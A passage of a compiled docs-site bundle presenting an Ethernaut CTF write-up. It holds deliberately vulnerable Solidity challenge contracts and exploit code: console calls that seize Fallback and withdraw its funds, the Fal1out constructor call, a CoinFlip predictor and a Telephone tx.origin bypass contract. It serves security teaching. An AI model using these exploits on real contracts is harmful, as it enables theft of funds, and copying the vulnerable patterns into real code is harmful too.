import{_ as o,K as c,L as i,M as n,N as s,a5 as a,W as l,F as t}from"./framework-edebdfe1.js";const u={},k=n("h1",{id:"oenzeppelin",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#oenzeppelin","aria-hidden":"true"},"#"),s(" Oenzeppelin")],-1),r={id:"ethernautctf",tabindex:"-1"},d=n("a",{class:"header-anchor",href:"#ethernautctf","aria-hidden":"true"},"#",-1),v={href:"https://ethernaut.openzeppelin.com/",target:"_blank",rel:"noopener noreferrer"},b=l(`<h2 id="hello-ethernaut" tabindex="-1"><a class="header-anchor" href="#hello-ethernaut" aria-hidden="true">#</a> Hello Ethernaut</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Instance</span> <span class="token punctuation">{</span>
    <span class="token builtin">string</span> <span class="token keyword">public</span> password<span class="token punctuation">;</span>
    <span class="token builtin">uint8</span> <span class="token keyword">public</span> infoNum <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>
    <span class="token builtin">string</span> <span class="token keyword">public</span> theMethodName <span class="token operator">=</span> <span class="token string">&quot;The method name is method7123949.&quot;</span><span class="token punctuation">;</span>
    <span class="token builtin">bool</span> <span class="token keyword">private</span> cleared <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token comment">// constructor</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        password <span class="token operator">=</span> _password<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;You will find what you need in info1().&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">info1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&#39;Try info2(), but with &quot;hello&quot; as a parameter.&#39;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">info2</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> param<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token string">&quot;hello&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">&quot;The property infoNum holds the number of the next info method to call.&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token string">&quot;Wrong parameter.&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">info42</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;theMethodName is the name of the next method.&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">method7123949</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;If you know the password, submit it to authenticate().&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">authenticate</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> passkey<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>passkey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            cleared <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">getCleared</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> cleared<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="fallback" tabindex="-1"><a class="header-anchor" href="#fallback" aria-hidden="true">#</a> Fallback</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Fallback</span> <span class="token punctuation">{</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> contributions<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">onlyOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">&quot;caller is not the owner&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">contribute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> <span class="token number">0.001</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
        contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;</span> contributions<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">getContribution</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
        <span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

await <span class="token keyword">contract</span><span class="token punctuation">.</span>contribute<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token keyword">from</span><span class="token punctuation">:</span> player<span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token function">toWei</span><span class="token punctuation">(</span><span class="token string">&#39;0.0001&#39;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
await <span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token keyword">from</span><span class="token punctuation">:</span> player<span class="token punctuation">,</span> to<span class="token punctuation">:</span> <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token builtin">address</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token function">toWei</span><span class="token punctuation">(</span><span class="token string">&#39;0.000001&#39;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">owner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="fallout" tabindex="-1"><a class="header-anchor" href="#fallout" aria-hidden="true">#</a> Fallout</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Fallout</span> <span class="token punctuation">{</span>
    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>

    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> allocations<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

    <span class="token comment">/* constructor */</span>
    <span class="token keyword">function</span> <span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        allocations<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">onlyOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">&quot;caller is not the owner&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">sendAllocation</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        allocator<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">collectAllocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">allocatorBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="coinflip" tabindex="-1"><a class="header-anchor" href="#coinflip" aria-hidden="true">#</a> CoinFlip</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">{</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>
        <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue <span class="token operator">/</span> FACTOR<span class="token punctuation">;</span>
        <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">HackCoinFlip</span><span class="token punctuation">{</span>
    CoinFlip <span class="token keyword">public</span> coinFlipContract<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _coinFlipContract<span class="token punctuation">)</span><span class="token punctuation">{</span>
        coinFlipContract <span class="token operator">=</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span>_coinFlipContract<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">guessFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue <span class="token operator">/</span> FACTOR<span class="token punctuation">;</span>
        <span class="token builtin">bool</span> guess <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        coinFlipContract<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="telephone" tabindex="-1"><a class="header-anchor" href="#telephone" aria-hidden="true">#</a> Telephone</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Telephone</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    Telephone telephone<span class="token punctuation">;</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _address<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        telephone <span class="token operator">=</span> <span class="token function">Telephone</span><span class="token punctuation">(</span>_address<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _address<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        telephone<span class="token punctuation">.</span><span class="token function">changeOwner</span><span class="token punctuation">(</span>_address<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="token" tabindex="-1"><a class="header-anchor" href="#token" aria-hidden="true">#</a> Token</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token punctuation">{</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> balances<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> totalSupply<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> totalSupply <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
